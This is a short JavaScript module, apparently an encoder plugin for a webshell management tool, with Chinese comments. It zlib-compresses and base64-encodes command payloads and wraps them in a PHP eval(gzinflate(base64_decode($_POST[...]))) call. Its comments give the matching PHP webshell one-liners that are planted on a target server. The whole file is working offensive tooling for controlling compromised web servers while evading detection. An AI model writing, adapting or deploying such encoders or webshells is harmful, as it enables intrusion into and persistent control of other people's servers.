/**
 * php::zlib_deflated_raw 编码器
 * Create at: 2019/01/12 00:05:44
 * zlib 压缩 payload, 适配 shell 见代码处
 */

'use strict';

var zlib = require('zlib');
/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data) => {
  // ##########    请在下方编写你自己的代码   ###################
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = zlib.deflateRawSync(data['_']).toString('base64');
  
  // <?php @eval($_POST['ant']);?>
  //data[pwd] = `eval(@gzinflate(base64_decode($_POST[${randomID}])));`;
  
  // <?php @eval(@gzinflate(base64_decode($_POST['ant']))); ?>
  data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[${randomID}])));`).toString('base64');
  
  // <?php @eval(@gzinflate(base64_decode($_POST['ant']))); ?>
  // data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[${randomID}])));`).toString('base64');
  
  // ##########    请在上方编写你自己的代码   ###################

  delete data['_'];
  return data;
}
